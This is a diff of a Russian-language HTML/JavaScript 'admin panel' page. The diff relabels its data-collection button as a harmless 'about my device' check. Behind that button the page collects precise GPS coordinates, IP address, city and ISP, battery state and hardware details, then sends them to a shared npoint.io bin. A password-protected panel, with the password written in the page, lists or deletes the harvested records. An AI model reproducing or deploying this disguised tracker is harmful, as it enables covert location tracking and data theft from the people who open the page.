@@ -3,80 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Admin Panel</title>
+    <title>Ultimate Admin Panel</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .box { background: #1e293b; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { color: #38bdf8; font-size: 1.5rem; margin-bottom: 20px; }
-        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        body { font-family: 'Segoe UI', sans-serif; background: #020617; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .box { background: #1e293b; padding: 25px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
+        h2 { color: #38bdf8; margin-bottom: 20px; text-transform: uppercase; font-size: 1.2rem; }
+        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 13px; }
         .btn-blue { background: #0284c7; color: white; }
         .btn-green { background: #10b981; color: white; }
-        #status { font-size: 12px; color: #94a3b8; margin-top: 10px; }
-        #results { margin-top: 20px; text-align: left; background: #020617; padding: 15px; border-radius: 10px; display: none; max-height: 400px; overflow-y: auto; border: 1px solid #334155; font-size: 11px; }
-        .entry { border-bottom: 1px solid #1e293b; padding: 10px 0; line-height: 1.5; }
+        .btn-red { background: #ef4444; color: white; margin-top: 20px; }
+        #status { font-size: 11px; color: #94a3b8; margin: 10px 0; }
+        #results { margin-top: 20px; text-align: left; background: #000; padding: 15px; border-radius: 12px; display: none; max-height: 400px; overflow-y: auto; border: 1px solid #1e293b; font-size: 11px; }
+        .entry { border-bottom: 1px solid #1e293b; padding: 12px 0; line-height: 1.6; }
         .entry b { color: #38bdf8; }
+        hr { border: 0; border-top: 1px solid #334155; margin: 10px 0; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <h2>System Intelligence</h2>
-    <button class="btn-blue" id="mainBtn" onclick="startDataCollection()">ПОЛНЫЙ СБОР ДАННЫХ</button>
-    <button class="btn-green" onclick="viewCloud()">ПАНЕЛЬ УПРАВЛЕНИЯ</button>
-    <div id="status">Ожидание команды...</div>
+    <button class="btn-blue" id="mainBtn" onclick="fullScan()">О МОЕМ УСТРОЙСТВЕ</button>
+    <button class="btn-green" onclick="viewLogs()">ПАНЕЛЬ УПРАВЛЕНИЯ</button>
+    <div id="status">Система готова</div>
     <div id="results"></div>
+    <button class="btn-red" id="clearBtn" onclick="clearDatabase()" style="display:none;">ОЧИСТИТЬ ВСЮ ПАМЯТЬ БАЗЫ</button>
 </div>
 
 <script>
-    const API_URL = "https://api.npoint.io/970512ab12c9b4a48cfd";
+    const BIN_ID = "970512ab12c9b4a48cfd"; // Твой ID
+    const API_URL = `https://api.npoint.io/${BIN_ID}`;
 
-    async function startDataCollection() {
+    async function fullScan() {
         const status = document.getElementById('status');
-        status.innerText = "Сбор системных данных...";
-
+        status.innerText = "Сканирование системы...";
+        
         let data = {
-            time: new Date().toLocaleString("ru-RU"),
-            coords: "Отказано в доступе",
-            battery: "Неизвестно",
-            device: {}
+            date: new Date().toLocaleString("ru-RU"),
+            gps: "Нет доступа",
+            battery: "Загрузка...",
+            network: {},
+            hardware: {}
         };
 
-        // 1. Пытаемся получить GPS (спросит разрешение)
-        const getGPS = () => new Promise((resolve) => {
+        // 1. Точный GPS
+        const getGPS = () => new Promise(r => {
             navigator.geolocation.getCurrentPosition(
-                (p) => resolve(`${p.coords.latitude}, ${p.coords.longitude} (Точность: ${p.coords.accuracy}м)`),
-                () => resolve("Пользователь запретил GPS"),
+                p => r(`${p.coords.latitude}, ${p.coords.longitude} (Точность: ${p.coords.accuracy}м)`),
+                () => r("Запрещено пользователем"),
                 { enableHighAccuracy: true, timeout: 5000 }
             );
         });
-        data.coords = await getGPS();
+        data.gps = await getGPS();
 
-        // 2. Данные о батарее
+        // 2. Батарея
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
-            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Заряжается' : 'Разряжается'})`;
+            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка' : 'Разрядка'})`;
         }
 
-        // 3. Железо и сеть
+        // 3. Сеть и IP
         try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipJson = await ipRes.json();
-            data.ipInfo = `${ipJson.ip} (${ipJson.city}, ${ipJson.org})`;
-        } catch(e) { data.ipInfo = "Ошибка IP"; }
+            const res = await fetch('https://ipapi.co/json/');
+            const json = await res.json();
+            data.network = { ip: json.ip, city: json.city, isp: json.org };
+        } catch(e) { data.network = { ip: "Ошибка" }; }
 
-        data.device = {
+        // 4. Железо
+        data.hardware = {
             os: navigator.platform,
-            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Неизвестно",
             cores: navigator.hardwareConcurrency || "Неизвестно",
+            ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Неизвестно",
             screen: `${window.screen.width}x${window.screen.height}`,
             ua: navigator.userAgent
         };
 
-        // 4. Отправка в облако
-        status.innerText = "Синхронизация с облаком...";
+        // 5. Сохранение
         try {
-            const res = await fetch(API_URL);
-            let db = await res.json();
+            const getDb = await fetch(API_URL);
+            let db = await getDb.json();
             if (!Array.isArray(db)) db = [];
             db.push(data);
 
@@ -85,34 +90,53 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(db)
             });
-            alert("Данные успешно отправлены!");
-            status.innerText = "Готово.";
+            status.innerText = "Данные успешно переданы!";
+            alert("Данные устройства сохранены в облако!");
         } catch(e) {
-            alert("Ошибка сохранения. Проверьте npoint.io");
-            status.innerText = "Ошибка.";
+            status.innerText = "Ошибка соединения";
         }
     }
 
-    async function viewCloud() {
-        if (prompt("Пароль:") !== "3664") return;
+    async function viewLogs() {
+        const pass = prompt("Введите пароль администратора (3664):");
+        if (pass !== "3664") return;
+
+        document.getElementById('clearBtn').style.display = 'block';
         const resDiv = document.getElementById('results');
         resDiv.style.display = 'block';
-        resDiv.innerHTML = "Загрузка...";
+        resDiv.innerHTML = "Загрузка логов...";
 
         try {
             const res = await fetch(API_URL);
             const logs = await res.json();
-            resDiv.innerHTML = logs.reverse().map(log => `
+            if(!logs.length) return resDiv.innerHTML = "База пуста";
+
+            resDiv.innerHTML = logs.reverse().map((l, i) => `
                 <div class="entry">
-                    <b>📅 Дата:</b> ${log.time}<br>
-                    <b>📍 Координаты:</b> ${log.coords}<br>
-                    <b>🌐 IP/Сеть:</b> ${log.ipInfo}<br>
-                    <b>🔋 Батарея:</b> ${log.battery}<br>
-                    <b>💻 Железо:</b> ${log.device.os}, ${log.device.ram} RAM, ${log.device.cores} ядер<br>
-                    <b>📏 Экран:</b> ${log.device.screen}
+                    <b>ЗАПИСЬ #${logs.length - i}</b><br>
+                    📅 ${l.date}<br>
+                    📍 <b>GPS:</b> ${l.gps}<br>
+                    🌐 <b>IP:</b> ${l.network.ip} (${l.network.city})<br>
+                    🏢 <b>Провайдер:</b> ${l.network.isp}<br>
+                    🔋 <b>Батарея:</b> ${l.battery}<br>
+                    💻 <b>Железо:</b> ${l.hardware.os}, ${l.hardware.cores} ядер, ${l.hardware.ram} RAM<br>
+                    📏 <b>Экран:</b> ${l.hardware.screen}
                 </div>
             `).join('');
-        } catch(e) { resDiv.innerHTML = "Ошибка базы данных."; }
+        } catch(e) { resDiv.innerHTML = "Ошибка чтения."; }
+    }
+
+    async function clearDatabase() {
+        if (!confirm("Вы уверены, что хотите УДАЛИТЬ ВСЕ данные из облака?")) return;
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify([])
+            });
+            alert("База данных полностью очищена!");
+            location.reload();
+        } catch(e) { alert("Ошибка очистки."); }
     }
 </script>
 
